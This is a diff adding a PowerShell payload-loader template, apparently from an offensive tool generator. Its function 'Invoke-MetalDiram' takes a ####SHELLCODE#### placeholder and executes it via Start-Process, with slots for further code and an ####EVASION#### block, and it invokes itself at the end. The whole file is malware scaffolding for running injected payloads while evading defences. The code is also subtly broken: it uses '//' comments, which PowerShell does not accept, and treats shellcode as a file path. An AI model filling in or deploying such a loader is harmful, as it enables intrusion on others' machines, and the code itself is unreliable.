@@ -1,0 +1,22 @@
+//####CODE####
+
+function Invoke-MetalDiram {
+    $buf = ####SHELLCODE####
+    
+    //####CALL####
+    
+    # Handle text input differently from binary
+    if ($buf -is [string]) {
+        # Execute command directly using Start-Process
+        Start-Process -FilePath $buf -NoNewWindow -Wait
+    }
+    else {
+        # Convert binary data to string and execute
+        $commandString = [System.Text.Encoding]::UTF8.GetString($buf)
+        Start-Process -FilePath $commandString -NoNewWindow -Wait
+    }
+}
+
+//####EVASION####
+
+Invoke-MetalDiram
